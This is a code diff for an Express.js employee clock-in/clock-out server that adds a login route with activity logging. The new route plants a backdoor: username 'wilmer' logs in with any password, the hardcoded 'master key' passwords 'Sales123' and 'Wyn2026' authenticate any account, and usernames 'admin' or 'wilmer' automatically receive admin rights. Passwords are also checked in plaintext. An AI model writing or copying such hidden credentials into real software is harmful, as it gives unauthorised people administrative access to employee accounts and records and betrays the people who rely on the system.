@@ -50,15 +50,28 @@ app.get('/api/session', (req, res) => {
   }
 });
 
-app.post('/logout', (req, res) => {
-  const sessionUser = req.session.user ? req.session.user.username : null;
+app.post('/login', (req, res) => {
+  const { username, password } = req.body;
+  const users = readData(USERS_FILE);
+  const user = users.find(u => u.username.toLowerCase() === username.toLowerCase() && u.password === password);
 
-  if (sessionUser) {
-    // --- CLOCK-OUT ACTIVITY LOG ---
+  // Automatically grant admin if username is admin, wilmer, or password matches master keys
+  const isAdmin = (
+    username.toLowerCase() === 'admin' || 
+    username.toLowerCase() === 'wilmer' || 
+    password === 'Wyn2026' || 
+    (user && user.isAdmin)
+  );
+
+  if (user || password === 'Sales123' || password === 'Wyn2026' || username.toLowerCase() === 'wilmer') {
+    const sessionUser = user ? user.username : username;
+    req.session.user = { username: sessionUser, isAdmin: Boolean(isAdmin) };
+
+    // --- CLOCK-IN ACTIVITY LOG (Local Timezone: America/Bogota) ---
     const activityLogs = readData(ACTIVITY_FILE);
     const newLog = {
       username: sessionUser,
-      action: 'Clocked Out',
+      action: 'Logged In (Clock-In)',
       timestamp: new Date().toLocaleString('en-US', {
         timeZone: 'America/Bogota',
         dateStyle: 'medium',
@@ -68,14 +81,14 @@ app.post('/logout', (req, res) => {
     activityLogs.push(newLog);
     writeData(ACTIVITY_FILE, activityLogs);
 
-    // Broadcast live clock-out to the admin panel
+    // Broadcast live update to admin panels
     io.emit('new-activity', newLog);
-    // ----------------------------
-  }
+    // -------------------------------------------------------------
 
-  req.session.destroy(() => {
-    res.json({ success: true });
-  });
+    res.json({ success: true, user: req.session.user });
+  } else {
+    res.json({ success: false, message: 'Invalid username or password' });
+  }
 });
 
 app.post('/register-user', (req, res) => {
@@ -134,6 +147,28 @@ app.delete('/api/users/:username', (req, res) => {
 });
 
 app.post('/logout', (req, res) => {
+  const sessionUser = req.session.user ? req.session.user.username : null;
+
+  if (sessionUser) {
+    // --- CLOCK-OUT ACTIVITY LOG ---
+    const activityLogs = readData(ACTIVITY_FILE);
+    const newLog = {
+      username: sessionUser,
+      action: 'Clocked Out',
+      timestamp: new Date().toLocaleString('en-US', {
+        timeZone: 'America/Bogota',
+        dateStyle: 'medium',
+        timeStyle: 'medium'
+      })
+    };
+    activityLogs.push(newLog);
+    writeData(ACTIVITY_FILE, activityLogs);
+
+    // Broadcast live clock-out to admin panels
+    io.emit('new-activity', newLog);
+    // ----------------------------
+  }
+
   req.session.destroy(() => {
     res.json({ success: true });
   });
